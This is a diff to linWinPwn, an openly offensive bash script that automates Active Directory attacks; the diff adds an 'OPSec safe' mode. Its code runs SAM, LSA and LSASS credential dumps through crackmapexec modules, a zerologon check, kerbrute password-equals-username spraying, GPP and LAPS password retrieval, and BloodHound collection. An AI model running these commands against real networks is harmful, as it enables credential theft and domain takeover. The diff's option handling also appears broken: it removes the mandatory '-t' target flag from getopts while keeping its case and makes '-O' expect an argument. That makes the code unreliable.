@@ -6,10 +6,9 @@
 #     | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | |
 #     |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
 #
-# linWinPwn - alpha version (https://github.com/lefayjey/linWinPwn)
+# linWinPwn - version 0.1.1 (https://github.com/lefayjey/linWinPwn)
 # Author: lefayjey
 # Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
-# Latest update : 02/02/2022
 #
 
 
@@ -29,7 +28,7 @@ modules="ad_enum,kerberos"
 output_dir="."
 pass_list="/usr/share/wordlists/rockyou.txt"
 users_list="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
-lsassy_bool=true
+opsec_bool=false
 
 #Tools variables
 python=$(which python3)
@@ -53,7 +52,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.1
+      ${BLUE}linWinPwn: ${CYAN} version 0.1.1
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey
 ${NC}
@@ -74,10 +73,10 @@ help_linWinPwn () {
     echo -e "-o     Output directory (default: current dir)"
     echo -e ""
     echo -e "${YELLOW}Additional parameters${NC}"
+    echo -e "-O     Run only OPSec Safe checks (authenticated mode)"
     echo -e "-U     Custom username list used during anonymous checks"
     echo -e "-P     Custom password list used during password cracking"
     echo -e "-S     Custom servers list used during password dumping"
-    echo -e "-L     with pwd_dump to skip execution of lsassy"
     echo -e ""
     echo -e "${YELLOW}Example usages${NC}"
     echo -e "./$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
@@ -85,7 +84,7 @@ help_linWinPwn () {
     echo -e ""
 }
 
-while getopts ":d:u:p:t:M:o:U:P:S:Lh" opt; do
+while getopts ":d:u:p:O:M:o:U:P:S:Lh" opt; do
   case $opt in
     d) domain="${OPTARG}";;
     u) user="${OPTARG}";; #leave empty for anonymous login
@@ -93,7 +92,7 @@ while getopts ":d:u:p:t:M:o:U:P:S:Lh" opt; do
     t) dc_ip="${OPTARG}";; #mandatory
     M) modules="${OPTARG}";; #comma separated modules to run
     o) output_dir="${OPTARG}";;
-    L) lsassy_bool=false;;
+    O) opsec_bool=true;;
     U) users_list="${OPTARG}";;
     P) pass_list="${OPTARG}";;
     S) servers_list="${OPTARG}";;
@@ -219,30 +218,24 @@ dns_enum () {
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] adidnsdump requires credentials${NC}"
             echo ${dc_ip} >> ${servers_ip_list}
-       elif [ "${kerb_bool}" == true ] ; then
+            echo ${dc_FQDN} >> ${dc_hostname_list}
+        elif [ "${kerb_bool}" == true ] ; then
             echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
             echo ${dc_ip} >> ${servers_ip_list}
+            echo ${dc_FQDN} >> ${dc_hostname_list}
         else
             ${adidnsdump} ${argument_ldapdns} --dns-tcp ${dc_ip}
             mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
             /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
-            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep -i "dc\|dns" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${dc_ip_list}
+            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 >> ${dc_ip_list}
             /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
-            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep -i "dc\|dns" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 2 >> ${dc_hostname_list}
+            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 >> ${dc_hostname_list}
             /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 2 >> ${sql_hostname_list}
         fi
     else
         echo -e "${YELLOW}[i] DNS dump found ${NC}"
     fi
 
-    sort -u ${servers_ip_list} > ${output_dir}/DomainRecon/ip_list_sorted_${dc_domain}.txt
-    mv ${output_dir}/DomainRecon/ip_list_sorted_${dc_domain}.txt ${servers_ip_list} 2>/dev/null
-    echo ${dc_ip} >> ${dc_ip_list}
-    sort -u ${dc_ip_list} > ${output_dir}/DomainRecon/ip_list_dc_sorted_${dc_domain}.txt
-    mv ${output_dir}/DomainRecon/ip_list_dc_sorted_${dc_domain}.txt ${dc_ip_list} 2>/dev/null
-    echo ${dc_FQDN} >> ${dc_hostname_list}
-    sort -u ${dc_hostname_list} > ${output_dir}/DomainRecon/server_list_dc_sorted_${dc_domain}.txt
-    mv ${output_dir}/DomainRecon/server_list_dc_sorted_${dc_domain}.txt ${dc_hostname_list} 2>/dev/null
     echo -e ""
 }
 
@@ -346,9 +339,10 @@ ad_enum () {
         cd ${output_dir}/DomainRecon/BloodHound/${dc_domain}
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
-        else
+        elif [ "${opsec_bool}" == true ] ; then
             ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp
-            #${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp
+        else
+            ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp
         fi
         cd ${current_dir}
         
@@ -402,8 +396,10 @@ ad_enum () {
         echo -e "${CYAN}[*] GPP checks ${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_autologin 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_password 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
-        echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
-        ${crackmapexec} smb ${target} ${argument_cme} -M zerologon 2>/dev/null | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
+        if [ "${opsec_bool}" == false ] ; then
+            echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
+            ${crackmapexec} smb ${target} ${argument_cme} -M zerologon 2>/dev/null | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
+        fi
         echo -e "${CYAN}[*] Password not required enum ${NC}"
         ${crackmapexec} ldap ${target_dc} ${argument_cme} --password-not-required --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
         echo -e "${CYAN}[*] laps dump ${NC}"
@@ -501,7 +497,7 @@ kerberos () {
                 /bin/cat ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>/dev/null
             fi
             
-        else
+        elif [ "${opsec_bool}" == false ] ; then
             echo -e "${YELLOW}[i] Password = username check using kerbrute. This may take a while...${NC}"
             for i in $(/bin/cat ${known_users_list}); do
                 ${kerbrute} -user ${i} -password ${i} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -threads 5 -outputfile ${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt | grep -v "Impacket" >> ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
@@ -650,7 +646,7 @@ pwd_dump () {
     fi
     echo -e ""
     
-    if [ "${lsassy_bool}" == true ] ; then
+    if [ "${opsec_bool}" == false ] ; then
         echo -e "${BLUE}[*] Dump creds from SAM, LSA and LSASS memory ${NC}"
     else
         echo -e "${BLUE}[*] Dump creds from SAM and LSA ${NC}"
@@ -666,9 +662,12 @@ pwd_dump () {
                 echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
                 ${crackmapexec} smb ${i} ${argument_cme} --lsa | tee ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
                 ${crackmapexec} smb ${i} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt
-                if [ "${lsassy_bool}" == true ] ; then
+                if [ "${opsec_bool}" == false ] ; then
                     echo -e "${CYAN}[*] LSASS dump of ${i} ${NC}"
                     ${crackmapexec} smb ${i} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt
+                    #${crackmapexec} smb ${i} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt
+                    #${crackmapexec} smb ${i} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt
+                    #${crackmapexec} smb ${i} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt
                 fi
             done
         fi
